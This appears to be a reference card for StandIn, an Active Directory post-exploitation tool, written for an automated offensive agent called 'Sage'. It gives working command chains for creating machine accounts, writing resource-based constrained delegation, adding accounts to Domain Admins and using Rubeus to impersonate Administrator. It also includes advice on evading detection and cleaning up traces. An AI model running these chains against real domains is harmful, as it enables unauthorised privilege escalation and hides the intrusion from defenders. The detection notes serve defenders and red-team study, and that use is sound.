---
name: StandIn
category: acl-abuse
subcategories: [rbcd, computer-object-creation, ad-manipulation, group-membership-add, acl-write, domain-admins-add]
tradecraft_tags: [rbcd, computer-account, delegation, acl, ad, fuzzysecurity, group, group-membership, add-member, addself, addmember, genericall, genericwrite, writedacl, writeowner, ldap, ldap-write, non-powershell, domain-admins]
mitre_attack:
  - id: T1098
    name: Account Manipulation
source:
  url: https://github.com/FuzzySecurity/StandIn
  license: Unknown
  maintained: true
binary_type: .net-assembly
binary_filename: StandIn.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  StandIn's computer object creation generates Event 4741 (computer account created)
  and LDAP writes to the domain. RBCD manipulation (writing msDS-AllowedToActOnBehalfOfOtherIdentity)
  generates Event 5136 (directory service object modification). Machine account quota
  (ms-DS-MachineAccountQuota) checks are standard LDAP reads. MDI monitors RBCD-related
  attribute writes.
usage_examples:
  - description: Create a new computer account (for RBCD)
    args: "--computer mypc01 --password Password123!"
  - description: Set RBCD on a target computer — allow mypc01 to impersonate users to TARGET$
    args: "--rbcd --computer mypc01 --target TARGET$"
  - description: Add a member to a domain group over LDAP without PowerShell — e.g. add an account to Domain Admins when you hold GenericAll/AddSelf/AddMember/WriteDACL on the group
    args: 'StandIn.exe --group "Domain Admins" --ntaccount "ESSOS\localuser" --add'
  - description: List existing RBCD delegations on a machine
    args: "--rbcd --list --computer TARGET$"
  - description: Remove RBCD delegation (cleanup)
    args: "--rbcd --remove --computer mypc01 --target TARGET$"
  - description: Query / verify group membership (run before and after the add to confirm the change)
    args: 'StandIn.exe --group "Domain Admins"'
opsec_notes: |
  Computer account creation (for RBCD) is audited — Event 4741 is generated and new
  machine accounts are visible in AD immediately. High-value RBCD targets (DCs, domain
  admins' machines) will attract attention if newly-created machine accounts appear in
  delegation ACLs. When possible, reuse an existing machine account you control rather
  than creating a new one. msDS-AllowedToActOnBehalfOfOtherIdentity writes on sensitive
  computer objects are a strong MDI detection signal.
gotchas: |
  MachineAccountQuota (MAQ, default=10) limits how many computer accounts a domain user
  can create — if MAQ is 0, StandIn's computer creation will fail. Check MAQ first
  (SharpHound output or LDAP query). RBCD requires the account being written to the
  delegation attribute to be a Security Principal with an SPN — a newly-created computer
  account has SPNs auto-generated, which makes it ideal. The S4U2self step then requires
  Rubeus with the computer account's credentials. Note: RBCD requires at minimum Windows
  Server 2012 functional level.
related_ttps: [rubeus, whisker, sharpgpoabuse, sharphound, krbrelay]
alternatives: [powermad, impacket-addcomputer]
common_args:
  --computer:
    name: --computer
    description: Computer account name (without $ suffix) for creation or RBCD operations
    typical_values: ["mypc01", "attacker-machine"]
    required: false
  --password:
    name: --password
    description: Password for newly-created computer account
    typical_values: ["Password123!", "Complex@Pass1"]
  --rbcd:
    name: --rbcd
    description: Enable RBCD mode — write or remove msDS-AllowedToActOnBehalfOfOtherIdentity
    typical_values: [flag-only]
  --target:
    name: --target
    description: Target computer account$ to write RBCD delegation to
    typical_values: ["WINTERFELL$", "DC01$"]
  --group:
    name: --group
    description: Operate on a group object
    typical_values: [flag-only]
  --add:
    name: --add
    description: Add member to group
    typical_values: [flag-only]
  --ntaccount:
    name: --ntaccount
    description: 'NT account (DOMAIN\User) to add to or remove from a group — the principal, used with --group --add/--remove'
    typical_values: ['ESSOS\localuser', 'NORTH\samwell.tarly']
  --remove:
    name: --remove
    description: Remove member or delegation
    typical_values: [flag-only]
  --list:
    name: --list
    description: List RBCD delegations on the target
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# StandIn

FuzzySecurity's multi-purpose AD manipulation tool for post-exploitation. StandIn's
primary use in RBCD (Resource-Based Constrained Delegation) chains is creating a new
machine account and writing it to the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`
attribute. It also handles general AD group manipulation, object queries, and ACL operations.

## Typical use cases
- Create a new machine account when you have GenericAll/WriteDACL on a computer object (RBCD setup step 1)
- Write the new machine account to msDS-AllowedToActOnBehalfOfOtherIdentity on the target (RBCD setup step 2)
- Add a user to a domain group when ACL allows self-addition (GenericAll/AddSelf)
- Query AD group memberships
- Clean up RBCD delegations after use

## How Sage uses this
StandIn is the RBCD setup tool in the Trust Walker chain. When SharpHound identifies a
computer object where the attacker has GenericWrite/GenericAll (or WriteDACL), the RBCD
chain is:
1. StandIn `--computer mypc01 --password ...` — create a machine account
2. StandIn `--rbcd --computer mypc01 --target TARGET$` — write delegation
3. Rubeus `asktgt` for mypc01 — get TGT for the machine account
4. Rubeus `s4u` — S4U2self + S4U2proxy to impersonate Administrator to CIFS/TARGET

KrbRelay can also automate the machine-account-creation + RBCD-write in a single operation
for local privilege escalation; StandIn is the explicit AD manipulation path for domain-level RBCD.

## Output
Text output confirming operations:
- `--computer` creation: success message with computer account DistinguishedName
- `--rbcd` write: confirmation with updated attribute value
- `--group` queries: group member listing

## OPSEC considerations
Machine account creation (Event 4741) and RBCD attribute writes (Event 5136) are audited
operations. High-value targets (DCs, domain admin workstations) will trigger MDI detection.
Prefer creating machine accounts with realistic-sounding names (not "pwned01"). Clean up
RBCD delegations and created machine accounts after use.

## Full Reference

> Captured against StandIn v0.9.0, 2026-05-29. Source: https://github.com/FuzzySecurity/StandIn README.

### Sub-commands / primary flags

| Flag | Description |
|------|-------------|
| `--computer X --password X` | Create a machine account with the specified name and password |
| `--rbcd --computer X --target X` | Write RBCD delegation: allow X$ to impersonate users to target |
| `--rbcd --list --computer X` | List RBCD delegations on target |
| `--rbcd --remove --computer X --target X` | Remove RBCD delegation |
| `--group "GroupName"` | Query group object (member list) |
| `--group "GroupName" --ntaccount "DOMAIN\User" --add` | Add a principal to a group (use when you hold GenericAll/AddSelf/AddMember/WriteDACL on the group) — verified syntax |
| `--group "GroupName" --ntaccount "DOMAIN\User" --remove` | Remove a principal from a group (cleanup) |
| `--object X` | Query a specific AD object by DN |
| `--ntacl --object X` | Dump NT ACL for an AD object |
| `--acl --object X --user X` | Add/modify ACE for a user on object |
| `--hash` | Hash manipulation operations |
| `--kerbfixup X` | Fix Kerberos SPN mapping |
| `--delegation --target X` | Query constrained delegation settings |
| `--policy` | Query fine-grained password policies |
| `--spn --domain X` | Query all SPNs in domain |

### RBCD workflow with Rubeus

```
# Step 1: Create machine account
StandIn.exe --computer mypc01 --password "P@ssw0rd123!"

# Step 2: Write RBCD
StandIn.exe --rbcd --computer mypc01 --target WINTERFELL$

# Step 3: Get TGT for new machine account
Rubeus.exe asktgt /user:mypc01$ /password:"P@ssw0rd123!" /domain:north.sevenkingdoms.local /nowrap

# Step 4: S4U chain to impersonate admin to target
Rubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator /msdsspn:cifs/WINTERFELL.north.sevenkingdoms.local /ptt
```

### Prerequisites

- `ms-DS-MachineAccountQuota` > 0 (default 10) for computer account creation
- GenericWrite or higher on target computer object for RBCD attribute write
- Windows Server 2012 R2+ domain functional level for RBCD

### Source for this reference

- https://github.com/FuzzySecurity/StandIn (README)
- FuzzySecurity blog: https://www.fuzzysecurity.com/tutorials/ad_exploitation/standin.html
- Version: v0.9.0 as of 2026-05-29
